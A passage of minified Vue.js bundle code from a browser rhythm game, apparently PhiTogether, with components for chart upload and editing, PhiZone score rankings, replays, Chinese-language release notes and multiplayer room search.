C=JSON.parse(sessionStorage.getItem("loadedChart")),R=JSON.parse(sessionStorage.getItem("chartDetailsData"));shared$1.game.multiInstance.loadChartSecond(R,C),shared$1.game.ptmain.$router.replace({path:"/chartSelect",query:{toSyncOrPlay:3}})};this.extraResource?(shared$1.game.userChartUploaded=k,hook.uploader.fireLoad({name:"assets.zip"},this.extraResource)):k()}})}}},$id$2=e=>document.getElementById(e),_hoisted_1$8={id:"cacheManage",class:"routerRealPage"},_hoisted_2$7=createBaseVNode("br",null,null,-1),_hoisted_3$7=createBaseVNode("br",null,null,-1),_hoisted_4$6=createBaseVNode("br",null,null,-1),_hoisted_5$6=createBaseVNode("br",null,null,-1),_hoisted_6$6={key:0,style:{color:"red"}},_hoisted_7$5=createBaseVNode("input",{name:"extraResource",type:"file",id:"extraResource"},null,-1),_hoisted_8$5=createBaseVNode("br",null,null,-1),_hoisted_9$5=createBaseVNode("br",null,null,-1),_hoisted_10$5=["value"],_hoisted_11$5=["value"];function _sfc_render$8(e,t,n,s,r,o){return openBlock(),createElementBlock("div",_hoisted_1$8,[createBaseVNode("div",{class:normalizeClass({cacheUnit:!0,blur:o.uiUserPreference}),style:{padding:"10px"}},[createBaseVNode("h3",null,toDisplayString$1(e.$t("userChartUpload.title")),1),createBaseVNode("p",null,[createTextVNode(toDisplayString$1(e.$t("userChartUpload.description.line0"))+" ",1),_hoisted_2$7,createTextVNode(" "+toDisplayString$1(e.$t("userChartUpload.description.line1"))+" ",1),_hoisted_3$7,createTextVNode(" "+toDisplayString$1(e.$t("userChartUpload.description.line2"))+" ",1),_hoisted_4$6,createTextVNode(" "+toDisplayString$1(e.$t("userChartUpload.description.line3")),1)]),_hoisted_5$6,this.target?(openBlock(),createElementBlock("p",_hoisted_6$6,toDisplayString$1(e.$t("userChartUpload.target",[r.targetInfo.name,r.targetInfo.level,r.targetInfo.difficulty,r.targetInfo.charter,r.target])),1)):createCommentVNode("",!0),createTextVNode(" "+toDisplayString$1(e.$t("userChartUpload.extraRes"))+"：",1),_hoisted_7$5,_hoisted_8$5,_hoisted_9$5,createBaseVNode("input",{type:"button",id:"add_library",class:"disabled",value:e.$t("userChartUpload.add"),onClick:t[0]||(t[0]=l=>o.userChartUploaded())},null,8,_hoisted_10$5),createBaseVNode("input",{type:"button",value:e.$t("userChartUpload.clear"),onClick:t[1]||(t[1]=l=>o.clearStatAll())},null,8,_hoisted_11$5)],2)])}const UserChartUploadComponent=_export_sfc(_sfc_main$8,[["render",_sfc_render$8]]),userChartEdit_vue_vue_type_style_index_0_lang="",_sfc_main$7={name:"userChartEdit",data(){return{songData:{composer:"",name:"",illustrator:"",charts:[]}}},mounted(){this.songData=JSON.parse(sessionStorage.getItem("chartDetailsData"))},methods:{async save(){if(!this.songData.composer||!this.songData.name||!this.songData.illustrator)if(await shared$1.game.msgHandler.confirm(this.$t("userChartEdit.askToFillWithUK")))this.songData.composer=this.songData.composer||"unknown",this.songData.name=this.songData.name||"unknown",this.songData.illustrator=this.songData.illustrator||"unknown";else return;const e=this.songData.id;await ptdb.chart.song.get(e).then(t=>(t.composer=this.songData.composer,t.name=this.songData.name,t.illustrator=this.songData.illustrator,t)).then(ptdb.chart.song.save).then(async()=>{for(const t in this.songData.charts)await ptdb.chart.chart.get(this.songData.charts[t].id).then(n=>(n.charter=this.songData.charts[t].charter||"unknown",n.level=this.songData.charts[t].level||"SP",n.difficulty=this.songData.charts[t].difficulty||"?",n)).then(ptdb.chart.chart.save).catch(n=>console.log(n,"error"))}).catch(t=>console.log(t,"error"));try{shared$1.game.msgHandler.sendMessage(this.$t("userChartEdit.success")),sessionStorage.setItem("chartDetailsData",JSON.stringify(this.songData)),this.$router.back()}catch{shared$1.game.msgHandler.sendMessage(this.$t("userChartEdit.error"),"error")}}}},_hoisted_1$7={id:"userChartEdit",class:"routerRealPage"},_hoisted_2$6={class:"userChartEditRow",style:{"font-size":"2em"}},_hoisted_3$6={class:"userChartEditRow"},_hoisted_4$5={class:"userChartEditRow"},_hoisted_5$5={class:"userChartEditRow"},_hoisted_6$5=createBaseVNode("br",null,null,-1),_hoisted_7$4={class:"userChartEditRow"},_hoisted_8$4={class:"userChartEditRow"},_hoisted_9$4=["onUpdate:modelValue"],_hoisted_10$4={class:"userChartEditRow"},_hoisted_11$4=["onUpdate:modelValue"],_hoisted_12$4=["onUpdate:modelValue"],_hoisted_13$4={class:"userChartEditRow"},_hoisted_14$4=["value"];function _sfc_render$7(e,t,n,s,r,o){return openBlock(),createElementBlock("div",_hoisted_1$7,[createBaseVNode("h1",_hoisted_2$6,toDisplayString$1(e.$t("userChartEdit.title")),1),createBaseVNode("div",_hoisted_3$6,[createTextVNode(toDisplayString$1(e.$t("userChartEdit.songName"))+"：",1),withDirectives(createBaseVNode("input",{class:"input textInput",style:{width:"calc(100%/2)"},"onUpdate:modelValue":t[0]||(t[0]=l=>r.songData.name=l)},null,512),[[vModelText,r.songData.name]])]),createBaseVNode("div",_hoisted_4$5,[createTextVNode(toDisplayString$1(e.$t("userChartEdit.composer"))+"：",1),withDirectives(createBaseVNode("input",{class:"input textInput",style:{width:"calc(100%/2)"},"onUpdate:modelValue":t[1]||(t[1]=l=>r.songData.composer=l)},null,512),[[vModelText,r.songData.composer]])]),createBaseVNode("div",_hoisted_5$5,[createTextVNode(toDisplayString$1(e.$t("userChartEdit.illustrator"))+"：",1),withDirectives(createBaseVNode("input",{class:"input textInput",style:{width:"calc(100%/2)"},"onUpdate:modelValue":t[2]||(t[2]=l=>r.songData.illustrator=l)},null,512),[[vModelText,r.songData.illustrator]])]),_hoisted_6$5,(openBlock(!0),createElementBlock(Fragment,null,renderList(r.songData.charts,l=>(openBlock(),createElementBlock("div",_hoisted_7$4,[createBaseVNode("h3",null,"ID: "+toDisplayString$1(l.id),1),createBaseVNode("div",_hoisted_8$4,[createTextVNode(toDisplayString$1(e.$t("userChartEdit.charter"))+"：",1),withDirectives(createBaseVNode("input",{class:"input textInput",style:{width:"calc(100%/2)"},"onUpdate:modelValue":d=>l.charter=d},null,8,_hoisted_9$4),[[vModelText,l.charter]])]),createBaseVNode("div",_hoisted_10$4,[createTextVNode(toDisplayString$1(e.$t("userChartEdit.level"))+"：",1),withDirectives(createBaseVNode("input",{class:"input textInput",style:{width:"calc(100%/6)"},"onUpdate:modelValue":d=>l.level=d},null,8,_hoisted_11$4),[[vModelText,l.level]]),createTextVNode(" "+toDisplayString$1(e.$t("userChartEdit.difficulty"))+"：",1),withDirectives(createBaseVNode("input",{class:"input textInput",style:{width:"calc(100%/6)"},"onUpdate:modelValue":d=>l.difficulty=d},null,8,_hoisted_12$4),[[vModelText,l.difficulty]])])]))),256)),createBaseVNode("div",_hoisted_13$4,[createBaseVNode("input",{type:"button",style:{width:"auto","font-size":"1.5em"},value:e.$t("userChartEdit.save"),onClick:t[3]||(t[3]=l=>o.save())},null,8,_hoisted_14$4)])])}const UserChartEditComponent=_export_sfc(_sfc_main$7,[["render",_sfc_render$7]]),playerB20_vue_vue_type_style_index_0_lang="",_sfc_main$6={name:"playerB20",data(){return{loaded:!1,data:null}},computed:{pzResUrlGlobal(){"res.phizone.cn"},loginInfo(){return shared$1.game.ptmain.gameConfig.account.userBasicInfo}},async mounted(){try{shared$1.game.loadHandler.l(this.$t("playerB20.loadB20"),"loadb20");const e=this.$route.query.id;this.data=await PhiZoneAPI.getPlayerB20Asv1(shared$1.game.ptmain.gameConfig.account.tokenInfo.access_token,e),this.loaded=!0}catch{shared$1.game.msgHandler.sendMessage(this.$t("playerB20.error"),"error")}finally{shared$1.game.loadHandler.r("loadb20")}},deactivated(){shared$1.game.loadHandler.r("loadb20")},methods:{scoreStr(e){const t=e.toFixed(0);return"0".repeat(t.length<7?7-t.length:0)+t}},watch:{}},_hoisted_1$6={key:0,class:normalizeClass({scoreMainContainer:!0,playerB20Container:!0})},_hoisted_2$5={id:"scoreContent"},_hoisted_3$5={class:"scoreRanking scoreRankingPerson"},_hoisted_4$4={class:"scoreRankingTitle"},_hoisted_5$4={class:"playerB20Card"},_hoisted_6$4={id:"playerCardUsrAvatarParent"},_hoisted_7$3={id:"playerCardUsrAvatar"},_hoisted_8$3=["src"],_hoisted_9$3={class:"playerB20Info"},_hoisted_10$3={class:"name"},_hoisted_11$3={class:"id"},_hoisted_12$3={class:"rks"},_hoisted_13$3={class:"exp"},_hoisted_14$3={class:"scoreRankingBody"},_hoisted_15$3={class:"scoreRankingBodyColum"},_hoisted_16$3={key:0,class:"scoreRankingCardEle"},_hoisted_17$3={class:"scoreSongCard"},_hoisted_18$3=["src"],_hoisted_19$2={class:"songCardCoverAll"},_hoisted_20$2=createBaseVNode("div",{class:"songCardID Phi"},"Phi",-1),_hoisted_21$2={class:"songCardName"},_hoisted_22$2={class:"songCardLevel"},_hoisted_23$2=createBaseVNode("br",null,null,-1),_hoisted_24$2={class:"songCardScore"},_hoisted_25$2={class:"songCardAcc"},_hoisted_26$2={class:"scoreRankingCardEle"},_hoisted_27$2={class:"scoreSongCard"},_hoisted_28$2=["src"],_hoisted_29$2={class:"songCardCoverAll"},_hoisted_30$2={class:"songCardID"},_hoisted_31$2={class:"songCardName"},_hoisted_32$2={class:"songCardLevel"},_hoisted_33$2=createBaseVNode("br",null,null,-1),_hoisted_34$2={class:"songCardScore"},_hoisted_35$1={class:"songCardAcc"};function _sfc_render$6(e,t,n,s,r,o){return openBlock(),createElementBlock("div",null,[createBaseVNode("div",null,[r.loaded?(openBlock(),createElementBlock("div",_hoisted_1$6,[createBaseVNode("div",_hoisted_2$5,[createBaseVNode("div",null,[createBaseVNode("div",_hoisted_3$5,[createBaseVNode("div",null,[createBaseVNode("div",_hoisted_4$4,[createBaseVNode("div",_hoisted_5$4,[createBaseVNode("div",_hoisted_6$4,[createBaseVNode("div",_hoisted_7$3,[createBaseVNode("img",{src:o.loginInfo.avatar.replace("res.phi.zone",o.pzResUrlGlobal)},null,8,_hoisted_8$3)])]),createBaseVNode("div",_hoisted_9$3,[createBaseVNode("p",_hoisted_10$3,toDisplayString$1(o.loginInfo.userName),1),createBaseVNode("p",_hoisted_11$3,"ID: "+toDisplayString$1(o.loginInfo.id),1),createBaseVNode("p",_hoisted_12$3,"RKS: "+toDisplayString$1(o.loginInfo.rks.toFixed(3)),1),createBaseVNode("p",_hoisted_13$3,"EXP: "+toDisplayString$1(o.loginInfo.experience.toFixed(0)),1)])])]),createBaseVNode("div",_hoisted_14$3,[createBaseVNode("div",_hoisted_15$3,[r.data.phi1&&r.data.phi1.chart?(openBlock(),createElementBlock("div",_hoisted_16$3,[createBaseVNode("div",_hoisted_17$3,[createBaseVNode("img",{src:r.data.phi1.chart.song.illustration},null,8,_hoisted_18$3),createBaseVNode("div",_hoisted_19$2,[_hoisted_20$2,createBaseVNode("div",_hoisted_21$2,toDisplayString$1(r.data.phi1.chart.song.name),1),createBaseVNode("div",_hoisted_22$2,[createTextVNode(toDisplayString$1(r.data.phi1.rks.toFixed(2)),1),_hoisted_23$2,createTextVNode(toDisplayString$1(r.data.phi1.chart.level)+" "+toDisplayString$1(r.data.phi1.chart.difficulty),1)]),createBaseVNode("div",_hoisted_24$2,toDisplayString$1(o.scoreStr(r.data.phi1.score)),1),createBaseVNode("div",_hoisted_25$2,toDisplayString$1((r.data.phi1.accuracy*100).toFixed(2))+"% ",1)])])])):createCommentVNode("",!0),(openBlock(!0),createElementBlock(Fragment,null,renderList(r.data.best19,(l,d)=>(openBlock(),createElementBlock("div",_hoisted_26$2,[createBaseVNode("div",_hoisted_27$2,[createBaseVNode("img",{src:l.chart.song.illustration},null,8,_hoisted_28$2),createBaseVNode("div",_hoisted_29$2,[createBaseVNode("div",_hoisted_30$2,"#"+toDisplayString$1(d+1),1),createBaseVNode("div",_hoisted_31$2,toDisplayString$1(l.chart.song.name),1),createBaseVNode("div",_hoisted_32$2,[createTextVNode(toDisplayString$1(l.rks.toFixed(2)),1),_hoisted_33$2,createTextVNode(toDisplayString$1(l.chart.level)+" "+toDisplayString$1(l.chart.difficulty),1)]),createBaseVNode("div",_hoisted_34$2,toDisplayString$1(o.scoreStr(l.score)),1),createBaseVNode("div",_hoisted_35$1,toDisplayString$1((l.accuracy*100).toFixed(2))+"%",1)])])]))),256))])])])])])])])):createCommentVNode("",!0)])])}const PlayerB20Component=_export_sfc(_sfc_main$6,[["render",_sfc_render$6]]),_sfc_main$5={name:"pzRankSingle",data(){return{loaded:!1,data:null,page:1,display:[],songdata:null,ct:null}},computed:{token(){return shared$1.game.ptmain.gameConfig.account.tokenInfo.access_token},pageAll(){if(!this.data)return 1;const e=this.data.count;return e?Math.ceil(e/30):1},canNext(){return!!this.data.next},canPrev(){return!!this.data.previous},pzResUrlGlobal(){"res.phizone.cn"},userInfo(){return shared$1.game.ptmain.gameConfig.account.userBasicInfo}},async mounted(){this.songdata=JSON.parse(sessionStorage.getItem("chartDetailsData")),this.ct=JSON.parse(sessionStorage.getItem("loadedChart"));try{shared$1.game.loadHandler.l("正在加载数据...","loadrecord");const e=this.$route.query.id;this.data=await PhiZoneAPI.getRecords(this.token,e,1),this.loaded=!0}catch{shared$1.game.msgHandler.sendMessage("加载数据时遇到错误","error")}finally{shared$1.game.loadHandler.r("loadrecord")}},deactivated(){shared$1.game.loadHandler.r("loadrecord")},methods:{async goJustPageAsk(){const e=await shared$1.game.msgHandler.prompt(`请输入您要跳转的页码 (1 - ${this.pageAll})`);e&&this.goJustPage(e)},async goJustPage(e){if(!(e>=1&&e<=this.pageAll)){shared$1.game.msgHandler.sendMessage("您的输入不合法","error");return}let t=this.data.previous||this.data.next||null;if(t){t=t.replace(/page=\d+&?/,"")+`&page=${e}`;try{shared$1.game.loadHandler.l("正在加载数据...","loadrecord"),this.data=await PhiZoneAPI.getRecords(this.token,null,null,t),this.page=e}catch{}finally{shared$1.game.loadHandler.r("loadrecord")}}},getDifficultyActual(e){return typeof e.difficulty=="string"?e.difficulty:e.difficulty===0?"?":e.difficulty.toFixed(1)},cleanStr(e){return e.replace(new RegExp([...e.matchAll(new RegExp("\\[PZ([A-Za-z]+):([0-9]+):((?:(?!:PZRT]).)*):PZRT\\]","g"))].length===0?"\\[PZ([A-Za-z]+):([0-9]+):([^\\]]+)\\]":"\\[PZ([A-Za-z]+):([0-9]+):((?:(?!:PZRT]).)*):PZRT\\]","gi"),"$3")},scoreStr(e){const t=e.toFixed(0);return"0".repeat(t.length<7?7-t.length:0)+t},async loadNextPage(){try{shared$1.game.loadHandler.l("正在加载数据...","loadrecord"),this.data=await PhiZoneAPI.getRecords(this.token,null,null,this.data.next),this.page++}catch{}finally{shared$1.game.loadHandler.r("loadrecord")}},async loadPrevPage(){try{shared$1.game.loadHandler.l("正在加载数据...","loadrecord"),this.data=await PhiZoneAPI.getRecords(this.token,null,null,this.data.previous),this.page--}catch{}finally{shared$1.game.loadHandler.r("loadrecord")}}},watch:{}},_hoisted_1$5={key:0},_hoisted_2$4={id:"chartDetailsHeader"},_hoisted_3$4={class:"scoreSongCard",style:{"margin-left":"5%","margin-right":"5%"}},_hoisted_4$3=["src"],_hoisted_5$3={class:"songCardName"},_hoisted_6$3={id:"chartSongDetails"},_hoisted_7$2={id:"songBPM"},_hoisted_8$2={id:"songDuration"},_hoisted_9$2={id:"scoreContent"},_hoisted_10$2={class:"scoreRanking scoreRankingNoPic"},_hoisted_11$2=createBaseVNode("div",{class:"scoreRankingTitle color-primary"}," 游玩记录 ",-1),_hoisted_12$2={class:"scoreRankingBody"},_hoisted_13$2={class:"scoreRankingBodyColum"},_hoisted_14$2={class:"scoreRankingEle"},_hoisted_15$2={class:"scoreRankingNum"},_hoisted_16$2={class:"scoreRankingExtra"},_hoisted_17$2={style:{"text-align":"center","font-size":"1.25em",color:"midnightblue","line-height":"1.2em",top:"8px"}},_hoisted_18$2=createBaseVNode("br",null,null,-1);function _sfc_render$5(e,t,n,s,r,o){return r.loaded?(openBlock(),createElementBlock("div",_hoisted_1$5,[createBaseVNode("div",_hoisted_2$4,[createBaseVNode("div",_hoisted_3$4,[createBaseVNode("img",{src:r.songdata.illustration.replace("res.phi.zone",o.pzResUrlGlobal)},null,8,_hoisted_4$3),createBaseVNode("div",{class:"songCardCover",style:normalizeStyle({"--bg":"url("+r.songdata.illustration.replace("res.phi.zone",o.pzResUrlGlobal)+")"})},[createBaseVNode("div",_hoisted_5$3,toDisplayString$1(r.songdata.name),1)],4)]),createBaseVNode("div",_hoisted_6$3,[createBaseVNode("div",_hoisted_7$2,"BPM："+toDisplayString$1(r.songdata.bpm),1),createBaseVNode("div",_hoisted_8$2,"时长："+toDisplayString$1(r.songdata.duration),1),createBaseVNode("div",null,"谱面："+toDisplayString$1(r.ct.level)+" "+toDisplayString$1(o.getDifficultyActual(r.ct))+" "+toDisplayString$1(r.ct.ranked?"Ranked":""),1),createBaseVNode("div",null,"谱师："+toDisplayString$1(o.cleanStr(r.ct.charter)),1)])]),createBaseVNode("div",_hoisted_9$2,[createBaseVNode("div",_hoisted_10$2,[_hoisted_11$2,createBaseVNode("div",_hoisted_12$2,[createBaseVNode("div",_hoisted_13$2,[(openBlock(!0),createElementBlock(Fragment,null,renderList(r.data.results,(l,d)=>(openBlock(),createElementBlock("div",_hoisted_14$2,[createBaseVNode("div",_hoisted_15$2,toDisplayString$1(r.page*30+d-29),1),createBaseVNode("div",{class:"scoreRankingUserName color-primary",style:normalizeStyle({color:l.player.id===o.userInfo.id?"red":"var(--color-text-primary)"})},toDisplayString$1(l.player.username),5),createBaseVNode("div",_hoisted_16$2,toDisplayString$1((l.acc*100).toFixed(2))+"% "+toDisplayString$1(o.scoreStr(l.score)),1)]))),256))])])])]),createBaseVNode("div",_hoisted_17$2,[o.canPrev?(openBlock(),createElementBlock("a",{key:0,onClick:t[0]||(t[0]=l=>o.loadPrevPage()),style:{color:"black"}},"◀")):createCommentVNode("",!0),createTextVNode("      "),o.canNext?(openBlock(),createElementBlock("a",{key:1,onClick:t[1]||(t[1]=l=>o.loadNextPage()),style:{color:"black"}},"▶")):createCommentVNode("",!0),_hoisted_18$2,createBaseVNode("span",{onClick:t[2]||(t[2]=l=>o.goJustPageAsk())},"第"+toDisplayString$1(r.page)+"页 共"+toDisplayString$1(o.pageAll)+"页",1)])])):createCommentVNode("",!0)}const PZRankSingleComponent=_export_sfc(_sfc_main$5,[["render",_sfc_render$5]]),_sfc_main$4={name:"replayPage",data(){return{recordFile:null}},async mounted(){const e=$id$1("recordFile"),t=this;e.onchange=()=>{const n=e.files[0],s=new FileReader;s.readAsText(n),s.onload=r=>{t.recordFile=r.target.result}}},computed:{uiBlurPreference(){return!shared$1.game.ptmain.gameConfig.noUIBlur}},methods:{playRecord(){shared$1.game.ptmain.playConfig={practiseMode:!0},shared$1.game.replayMgr.read(this.recordFile)}}},$id$1=e=>document.getElementById(e),_hoisted_1$4={id:"cacheManage",class:"routerRealPage"},_hoisted_2$3=createBaseVNode("br",null,null,-1),_hoisted_3$3=createBaseVNode("input",{name:"recordFile",type:"file",id:"recordFile"},null,-1),_hoisted_4$2=createBaseVNode("br",null,null,-1),_hoisted_5$2=createBaseVNode("br",null,null,-1),_hoisted_6$2=["value"];function _sfc_render$4(e,t,n,s,r,o){return openBlock(),createElementBlock("div",_hoisted_1$4,[createBaseVNode("div",{class:normalizeClass({cacheUnit:!0,blur:o.uiBlurPreference}),style:{padding:"10px"}},[createBaseVNode("h3",null,toDisplayString$1(e.$t("replayPage.title")),1),createBaseVNode("p",null,toDisplayString$1(e.$t("replayPage.description")),1),_hoisted_2$3,createTextVNode(" "+toDisplayString$1(e.$t("replayPage.recordFile"))+"：",1),_hoisted_3$3,_hoisted_4$2,_hoisted_5$2,createBaseVNode("input",{type:"button",id:"add_library",class:normalizeClass({disabled:!r.recordFile}),value:e.$t("replayPage.play"),onClick:t[0]||(t[0]=l=>o.playRecord())},null,10,_hoisted_6$2)],2)])}const ReplayPageComponent=_export_sfc(_sfc_main$4,[["render",_sfc_render$4]]),releaseNotes={releaseNotes:[{ver:"astroxxx public beta",time:"2023/??/?? Coming S∞n",notes:["仍处于开发阶段 请积极反馈bug","优化游玩界面","集成PhiZone v2","适配RPE文字判定线特性","适配RPE判定线UI绑定特性","新增练习模式 支持调整播放时间及速度","新增预览模式 支持练习模式的全部特性","关于页面中展示爱发电的捐赠者","全新打击音效","(并不)全新的结算背景音乐","页面顶端导航栏显示当前页面及玩家信息","使用全新血量算法","暂停页面显示游玩统计信息"]},{ver:"v1.3.2h14",time:"2023/07/27",notes:["修复Note大小调整相关的bug","谱面选择界面显示最佳成绩"]},{ver:"v1.3.2h13",time:"2023/07/26",notes:["PT社区谱面支持搜索","修复了PT社区谱面无法更新的 bug"]},{ver:"v1.3.2h12",time:"2023/07/26",notes:["修复了一些 bug"]},{ver:"v1.3.2h11",time:"2023/07/25",notes:["优化 PhiZone 登录,减少失败","修复未登录可能无法游玩的问题","修复 iOS 端血量条无法显示圆角的问题"]},{ver:"v1.3.2h10",time:"2023/07/22",notes:["适配一些常见 RPE 特性"]},{ver:"v1.3.2h9",time:"2023/07/21",notes:["自定义资源包支持打击特效随 Note 旋转","自定义资源包支持自定义判定线及打击特效颜色","修复与`自定义资源包`相关的一些 bug","多人游戏中禁止暂停"]},{ver:"v1.3.2h8",time:"2023/07/14",notes:["iOS App 导出游玩回放文件时显示二维码,方便在无法复制到剪贴板时下载文件","登录页面支持回车登录","将`更新日志`按钮移到主界面下方","优化全屏判定逻辑","修改血量条样式","修复若干 bugs"]},{ver:"v1.3.2h7",time:"2023/07/10",notes:["优化 PT社区谱面 加载,减轻服务器负担"]},{ver:"v1.3.2h6",time:"2023/07/10",notes:["本地曲目结算页面显示 PhiZone 用户信息","优化离线游玩体验"]},{ver:"v1.3.2h5",time:"2023/07/09",notes:["修复bugs"]},{ver:"v1.3.2h4",time:"2023/07/09",notes:["优化在线资源包使用","增加谱面特定资源包"]},{ver:"v1.3.2h3",time:"2023/07/09",notes:["新增转板模式：在单人游戏中,双击左下角可以进行转板操作","上线更新日志","取消选谱界面点击“选择”按钮时的二次确认","新增全屏判定(实验性功能,可能会在后续版本中下架)"]},{ver:"v1.3.2h2",time:"2023/07/08",notes:["修复与PT社区谱面相关的bug","优化PT社区谱面加载速度"]},{ver:"v1.3.2h1",time:"2023/07/08",notes:["修复导出游玩记录相关bug"]},{ver:"v1.3.2",time:"2023/07/07",notes:["重大更新：添加了额外选项-PT社区谱面 所有谱面均有授权！ 加载不出来的请清除缓存再此尝试！","预计8日-10日发布比赛PV"]},{ver:"v1.3.2h2",time:"2023/07/04",notes:["修复了在线资源包功能","iOS App增加生成游玩回放下载链接功能","修复iOS App无法下載回放文件的问题","移除了him","修复了无法游戏全屏的问题"]},{ver:"v1.3.0",time:"2023/06/24",notes:["新增游玩回放功能，可以导出单人游玩回放，并可以导出房间内成员的游玩回放。","支持使用资源包内打击音效。(感謝@星鹿ELEC)","避免加载与上次相同谱面时重复加载的问题。","变速成绩不再上传 PhiZone。","微调Flick判定。","修复部分显示问题。","修复其他已知bug。"]},{ver:"v1.2.2",time:"2023/05/15",notes:["PhiZone B20查询","单曲游玩记录排名查看（快速定位到自己的游玩记录和排除重复重复分数的排名暂未开发）","上传分数不再经过PT服务器中转，直接由浏览器上传至PhiZone。"]},{ver:"v1.2.1",time:"2023/05/03",notes:["支持iOS设备游玩自定义谱面和使用自定义资源包","在联机过程中出现本地谱面库没有的谱面会提示上传，现传现玩","支持编辑本地谱面基本信息","支持使用图片判定线等额外资源的谱面导入"]},{ver:"v1.2.0",time:"2023/05/02",notes:["添加本地谱面库功能，允许导入谱面文件到库并联机","本地谱面支持搜索和分页","增加一个新的 PhiTogether 预设资源包","添加自定义资源包功能，并支持保存该资源包，在启动时自动应用","浏览谱面列表时可直接跳转到对应页码","支持Fiter 滤镜功能","修复了iOS 16.4+ 无法正常游玩谱面的问题","修复了游戏画面错位问题","修改部分文字","移除了“皮在一起模拟器”隐藏入口","移除了him"]},{ver:"v1.1.0",time:"2023/03/18",notes:["增加了加载页面中的Tips","添加了关于页面中的运行正计时","UI 调整","主页（未登录显示样式调整）","关于页面（几项小修改）","其它小样式修复","修复了一些小 Bug","优化 Safari 触控"]}]},changelogs_vue_vue_type_style_index_0_lang="",_sfc_main$3={name:"changelogs",data(){return{ver:spec.thisVersion,vt:0}},computed:{releaseNotes(){return releaseNotes.releaseNotes}},methods:{}},_hoisted_1$3={id:"changelogs"};function _sfc_render$3(e,t,n,s,r,o){return openBlock(),createElementBlock("div",_hoisted_1$3,[createBaseVNode("h1",null,toDisplayString$1(e.$t("changelogs.title")),1),(openBlock(!0),createElementBlock(Fragment,null,renderList(o.releaseNotes,l=>(openBlock(),createElementBlock("div",null,[createBaseVNode("h2",null,toDisplayString$1(l.ver)+" - "+toDisplayString$1(l.time),1),createBaseVNode("ul",null,[(openBlock(!0),createElementBlock(Fragment,null,renderList(l.notes,d=>(openBlock(),createElementBlock("li",null,toDisplayString$1(d),1))),256))])]))),256))])}const ChangeLogsComponent=_export_sfc(_sfc_main$3,[["render",_sfc_render$3]]),_imports_0="/src/core/ptwithtitle.png",loadingPage_vue_vue_type_style_index_0_lang="",_sfc_main$2={name:"loadingPage",data(){return{ver:spec.thisVersion,loaded:!1,animated:!1,currentImageIndex:0}},computed:{},methods:{showNextImage(){const e=document.querySelectorAll(".loading-image");if(this.currentImageIndex>=e.length){this.animated=!0,this.loaded?this.$route.path==="/loading"&&this.$router.replace("/startPage"):shared$1.game.loadHandler.l(this.$t("loadingPage.loadingRes"),"loadRes");return}e[this.currentImageIndex].style.display="block",setTimeout(()=>{e[this.currentImageIndex]&&(e[this.currentImageIndex].style.display="none",this.currentImageIndex++,this.showNextImage())},2500)}},async mounted(){shared$1.game.loaded=()=>{this.loaded=!0,window.nativeApi&&window.nativeApi.antiAddiction_start&&(document.visibilityState!=="hidden"?window.nativeApi.antiAddiction_start():shared$1.game.afterShow.push(()=>window.nativeApi&&window.nativeApi.antiAddiction_start())),this.animated&&(shared$1.game.loadHandler.r("loadRes"),this.$route.path==="/loading"&&this.$router.replace("/startPage"))},await(()=>new Promise(t=>{const n=()=>{shared$1.game.requestedFullscreen?t():setTimeout(n,100)};setTimeout(n,100)}))(),this.showNextImage()}},_hoisted_1$2={id:"loadingPage"},_hoisted_2$2=createBaseVNode("img",{src:_imports_0,class:"loading-image"},null,-1),_hoisted_3$2=[_hoisted_2$2];function _sfc_render$2(e,t,n,s,r,o){return openBlock(),createElementBlock("div",_hoisted_1$2,_hoisted_3$2)}const LoadingPageComponent=_export_sfc(_sfc_main$2,[["render",_sfc_render$2]]),multiIndex_vue_vue_type_style_index_0_lang="",_sfc_main$1={name:"multiIndex",data(){return{roomList:[],filterType:"id",filterParam1:"",filterParam2:"",createConfig:{id:"",description:"",isPublic:!1},selectChoice:"join"}},computed:{isSingle(){return shared$1.game.ptmain.gameMode==="single"},userBlurPreference(){return!shared$1.game.ptmain.gameConfig.noUIBlur}},mounted(){this.loadPage()},deactivated(){shared$1.game.loadHandler.r("loadRoomInfo")},methods:{doSearch(){if(!this.filterParam1&&!this.filterParam2){this.loadPage();return}this.filterType==="id"&&this.filterParam1.startsWith("【PhiTogether")&&(this.filterParam1=this.filterParam1.match(/\$\$\$([^$]+)\$\$\$/)[1]),this.loadPage(this.filterType,this.filterParam1,this.filterParam2)},async loadPage(e="none",t="",n=""){try{shared$1.game.loadHandler.l(this.$t("multiIndex.loadRoomInfo"),"loadRoomInfo");const s=JSON.parse(await(await fetch(`https://mpcenter.phitogether.fun/api/multi/searchRoom?by=${e}&param1=${t}&param2=${n}`)).text());for(let r=0;r<s.length;r++)s[r].stage!=0||s[r].player_number>=20?(s[r].canJoin=!1,s[r].joinText=s[r].stage!=0?this.$t("multiIndex.roomLocked"):this.$t("multiIndex.roomFull")):(s[r].canJoin=!0,s[r].joinText=this.$t("multiIndex.join"));this.roomList=s,shared$1.game.loadHandler.r("loadRoomInfo")}catch(s){console.error(s),shared$1.game.loadHandler.r("loadRoomInfo")}},joinRoom(e){shared$1.game.loadHandler.l(this.$t("multiIndex.joining"),"joinRoom"),fetch(`https://mpcenter.phitogether.fun/api/multi/requestRoom/${e}?v=${spec.thisVersion}`).then(t=>t.json()).then(t=>{const n=t.server_addr;if(t.code!==0){shared$1.game.msgHandler.failure(t.msg),shared$1.game.loadHandler.r("joinRoom");return}shared$1.game.multiInstance.doJoinRoom(e,n)}).catch(()=>{shared$1.game.msgHandler.sendMessage(this.$t("multiIndex.err")),shared$1.game.loadHandler.r("joinRoom")})},createRoom(){let e=this.createConfig.id.trim();if(e.indexOf("$")>-1){shared$1.game.msgHandler.failure(this.$t("multiIndex.roomIdCantContainsDollar"));return}if(!e){shared$1.game.msgHandler.sendMessage(this.$t("multiIndex.roomId_cannot_be_empty"),"error");return}this.createConfig.description||(this.createConfig.description="No description."),shared$1.game.loadHandler.l(this.$t("multiIndex.joining"),"createRoom"),fetch(`https://mpcenter.phitogether.fun/api/multi/requestRoom/${e}?v=${spec.thisVersion}`).then(t=>t.json()).then(t=>{const n=t.server_addr;if(t.code!==-2){shared$1.game.msgHandler.failure(t.msg),shared$1.game.loadHandler.r("createRoom");return}shared$1.game.multiInstance.doCreateRoom(e,n,this.createConfig.description,this.createConfig.isPublic)}).catch(()=>{shared$1.game.msgHandler.sendMessage(this.$t("multiIndex.err")),shared$1.game.loadHandler.r("createRoom")})}},meta:{keepAlive:!1}},_hoisted_1$1={id:"songSelect",style:{width:"95%",margin:"0 